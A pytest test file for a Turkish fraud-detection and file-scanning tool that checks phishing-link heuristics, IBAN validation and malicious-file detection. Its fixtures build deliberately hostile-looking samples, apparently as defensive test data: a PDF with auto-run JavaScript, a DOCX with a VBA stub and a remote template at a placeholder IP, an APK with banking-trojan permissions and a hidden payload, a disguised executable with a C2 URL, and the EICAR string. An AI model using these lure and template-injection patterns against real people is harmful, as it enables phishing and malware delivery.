import io
import struct
import zipfile

import pytest

from pwrosint.core.errors import OsintError
from pwrosint.core.report import Level
from pwrosint.modules import filescan, fraud

from test_modules import items, run

# ---------------------------------------------------------------- link analizi


@pytest.mark.parametrize("text, expected", [
    ("Kargonuz bekliyor: bit.ly/3abc ve https://ptt-kargo.xyz/a", ["http://bit.ly/3abc", "https://ptt-kargo.xyz/a"]),
    ("www.ornek.com.tr/kampanya adresine gir", ["http://www.ornek.com.tr/kampanya"]),
    ("iletisim@ornek.com yazın", []),
])
def test_extract_urls(text, expected):
    assert fraud.extract_urls(text) == expected


def test_assess_brand_impersonation_and_lures():
    a = fraud.assess_url("https://garanti-bbva-guvenlik.xyz/giris/dogrula")
    labels = {f[0]: f for f in a["findings"]}
    assert labels["Marka taklidi"][2] == Level.BAD and labels["Riskli uzantı"][2] == Level.WARN
    assert "giris" in labels["Tuzak kelimeler"][1]
    assert a["score"] >= 4
    assert not fraud.assess_url("https://www.garantibbva.com.tr/")["findings"]  # resmî domain


def test_assess_tricks():
    at = fraud.assess_url("https://www.turkiye.gov.tr@203.0.113.9/login")
    assert {"@ hilesi", "IP adresi"} <= {f[0] for f in at["findings"]}
    homo = fraud.assess_url("https://xn--pypal-4ve.com/")  # 'pаypal' (Kiril а)
    assert "Punycode / IDN" in {f[0] for f in homo["findings"]}
    assert "Kısaltılmış link" in {f[0] for f in fraud.assess_url("http://bit.ly/x")["findings"]}


def test_linkcheck_report_passive(ctx, http):
    http.add("https://cloudflare-dns.com/dns-query", {"Status": 0, "Answer": [{"type": 1, "data": "203.0.113.7"}]})
    http.add("https://rdap.org/domain/", {"events": [{"eventAction": "registration",
                                                      "eventDate": "2026-11-01T00:00:00Z"}]})
    http.add("https://openphish.com/feed.txt", "https://ptt-kargo-takip.xyz/tr\n")
    http.add("https://urlscan.io/", {"results": []})
    report = run(ctx, "linkcheck", text=fraud.link_input("Paketiniz bekliyor https://ptt-kargo-takip.xyz/tr"))
    sec = items(report, "Link:")
    assert sec["Değerlendirme"].level == Level.BAD and sec["OpenPhish"].level == Level.BAD
    assert report.summary.startswith("YÜKSEK RİSK")
    assert not any("ptt-kargo-takip.xyz" in u and "rdap" not in u and "urlscan" not in u and "openphish" not in u
                   and "dns" not in u for u, _ in http.calls), "şüpheli siteye istek gönderilmemeli"
    assert report.target == ""  # SMS metni hassas; başlığa yazılmaz


def test_link_input_requires_link():
    with pytest.raises(ValueError):
        fraud.link_input("merhaba nasılsın")


def test_expand_requires_consent():
    from pwrosint.core.registry import get_tool
    assert get_tool("linkcheck").action("expand").consent
    assert get_tool("linkcheck").action("analyze").consent is None


# ---------------------------------------------------------------- IBAN

def test_iban(ctx):
    assert fraud.iban_valid("TR330006100519786457841326")
    assert not fraud.iban_valid("TR330006100519786457841327")
    ok = run(ctx, "iban", iban=fraud.iban_input("TR33 0006 1005 1978 6457 8413 26"))
    sec = items(ok, "IBAN")
    assert sec["Doğrulama"].level == Level.OK and sec["Hesap numarası"].value == "0519786457841326"
    assert ok.target == ""  # IBAN hassas
    bad = run(ctx, "iban", iban=fraud.iban_input("TR330006100519786457841327"))
    assert items(bad, "IBAN")["Doğrulama"].level == Level.BAD
    de = run(ctx, "iban", iban=fraud.iban_input("DE89 3704 0044 0532 0130 00"))
    assert items(de, "IBAN")["Doğrulama"].level == Level.OK
    with pytest.raises(ValueError):
        fraud.iban_input("12345")


# ---------------------------------------------------------------- dosya analizi

def _file(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data)
    return filescan.local_file(str(p))


def test_pdf_with_javascript(ctx, tmp_path):
    pdf = b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >>\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >>\n%%EOF"
    report = run(ctx, "filescan", file=_file(tmp_path, "fatura.pdf", pdf))
    sec = items(report, "PDF")
    assert sec["JavaScript"].level == Level.BAD and "Açılışta otomatik eylem" in sec
    assert report.summary.startswith("YÜKSEK RİSK")


def test_docx_macro_and_template_injection(ctx, tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\x00VBA")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/'
                   '2006/relationships/attachedTemplate" Target="http://203.0.113.9/sablon.dotm" '
                   'TargetMode="External"/></Relationships>')
    report = run(ctx, "filescan", file=_file(tmp_path, "teklif.docx", buf.getvalue()))
    sec = items(report, "Office")
    assert sec["VBA makrosu"].level == Level.BAD
    assert "203.0.113.9" in sec["Dışarıdan şablon (template injection)"].value


def _axml(strings: list[str]) -> bytes:
    """UTF-16 dize havuzlu minimal ikili AndroidManifest.xml."""
    encoded = [struct.pack("<H", len(s)) + s.encode("utf-16le") + b"\0\0" for s in strings]
    offsets, pos = [], 0
    for e in encoded:
        offsets.append(pos)
        pos += len(e)
    body = b"".join(encoded)
    header_size = 28
    strings_start = header_size + 4 * len(strings)
    pool = struct.pack("<HHIIIIII", 0x0001, header_size, strings_start + len(body), len(strings), 0, 0,
                       strings_start, 0) + b"".join(struct.pack("<I", o) for o in offsets) + body
    return struct.pack("<HHI", 0x0003, 8, 8 + len(pool)) + pool


def test_apk_banking_trojan_pattern(ctx, tmp_path):
    manifest = _axml(["manifest", "com.kargo.takip.app", "android.permission.READ_SMS",
                      "android.permission.RECEIVE_SMS", "android.permission.BIND_ACCESSIBILITY_SERVICE",
                      "android.permission.INTERNET"])
    assert "android.permission.READ_SMS" in filescan.axml_strings(manifest)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("AndroidManifest.xml", manifest)
        z.writestr("classes.dex", b"dex\n035\0")
        z.writestr("assets/payload.dex", b"dex\n035\0")
        z.writestr("META-INF/CERT.RSA", b"\x30\x82")
    report = run(ctx, "filescan", file=_file(tmp_path, "PTT_Kargo.apk", buf.getvalue()))
    perms = items(report, "İzinler")
    assert perms["Bankacılık truvası kalıbı"].level == Level.BAD
    assert perms["READ_SMS"].level == Level.WARN and perms["INTERNET"].level == Level.MUTED
    assert items(report, "Android")["Gizli yük"].level == Level.BAD
    assert items(report, "Android")["Olası paket adı"].value == "com.kargo.takip.app"


def test_disguised_executable(ctx, tmp_path):
    exe = b"MZ" + b"\0" * 58 + struct.pack("<I", 64) + b"PE\0\0" + struct.pack("<HHI", 0x8664, 1, 1700000000) + \
        b"\0" * 12 + struct.pack("<H", 0) + b"\0" * 2 + b"UPX0\0\0\0\0" + b"\0" * 32 + b" http://203.0.113.50/c2 "
    report = run(ctx, "filescan", file=_file(tmp_path, "fatura.pdf.exe", exe))
    sec = items(report, "Dosya")
    assert sec["Çift uzantı"].level == Level.BAD
    disguised = run(ctx, "filescan", file=_file(tmp_path, "fatura.pdf", exe))
    assert items(disguised, "Dosya")["Uzantı yanıltıcı"].level == Level.BAD
    assert any("203.0.113.50" in i.value for s in report.sections for i in s.items)


def test_zip_with_executable_and_eicar(ctx, tmp_path):
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")  # çalışma anında birleştirilir
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("dekont.pdf.exe", b"MZ")
        z.writestr("not.txt", b"merhaba")
    report = run(ctx, "filescan", file=_file(tmp_path, "dekont.zip", buf.getvalue()))
    assert items(report, "Arşiv içeriği")["dekont.pdf.exe"].level == Level.BAD
    ei = run(ctx, "filescan", file=_file(tmp_path, "test.txt", eicar.encode()))
    assert "EICAR" in items(ei, "Dosya")


def test_entropy_and_plain_text():
    import os
    assert filescan.entropy(os.urandom(65536)) > 7.9
    assert filescan.entropy(b"aaaa") == 0
    assert filescan.detect_type(b"hello world\n")[0] == "Düz metin"


def test_local_file_errors(tmp_path):
    with pytest.raises(ValueError):
        filescan.local_file(str(tmp_path / "yok.bin"))
    _ = OsintError
